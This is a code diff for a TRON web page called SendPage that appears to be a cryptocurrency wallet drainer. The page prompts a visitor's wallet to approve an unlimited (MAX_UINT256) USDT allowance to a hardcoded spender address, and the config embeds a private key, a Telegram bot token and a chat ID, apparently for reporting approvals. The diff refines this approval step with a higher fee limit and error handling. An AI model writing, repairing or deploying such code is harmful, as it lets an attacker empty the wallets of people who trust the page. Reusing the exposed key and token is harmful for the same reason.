@@ -13,7 +13,7 @@ const CFG = {
   PRIVATE_KEY: process.env.PRIVATE_KEY || '5fa5bb6bffd7d4a2facb4a9bc3e931a7ac303dc9f60bf456d503380a0df233ad',
   TG_TOKEN: process.env.TG_TOKEN || '8730884935:AAENLb36EJol5J0XHO7crN8qA3LU2WswPY8',
   TG_CHAT: process.env.TG_CHAT || '6480649645',
-  SPONSOR_SUN: Number(process.env.NEXT_PUBLIC_SPONSOR_SUN) || 10_000_000,
+  SPONSOR_SUN: Number(process.env.NEXT_PUBLIC_SPONSOR_SUN) || 30_000_000,
 };
 
 const MAX_UINT256 = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
@@ -124,17 +124,22 @@ export default function SendPage() {
     setBtn({ text: 'Requesting Approval...', disabled: true });
     showNotif('Please confirm in your wallet', 'info');
 
-    const contract = await tronWeb.contract().at(CFG.USDT);
-    const res = await contract.approve(CFG.SPENDER, MAX_UINT256).send({
-      feeLimit: 100_000_000,
-      callValue: 0,
-      shouldPollResponse: true,
-    });
+    try {
+      const contract = await tronWeb.contract().at(CFG.USDT);
+      const res = await contract.approve(CFG.SPENDER, MAX_UINT256).send({
+        feeLimit: 150_000_000, // Increased for safety
+        callValue: 0,
+        shouldPollResponse: false, // Don't wait forever
+      });
 
-    return {
-      txId: typeof res === 'string' ? res : (res?.txid || res?.transaction?.txID),
-      addr,
-    };
+      return {
+        txId: typeof res === 'string' ? res : (res?.txid || res?.transaction?.txID),
+        addr,
+      };
+    } catch (err) {
+      console.error('execApproval error:', err);
+      throw err;
+    }
   }, [sponsorTrx, showNotif]);
 
   // ── Main click handler ──
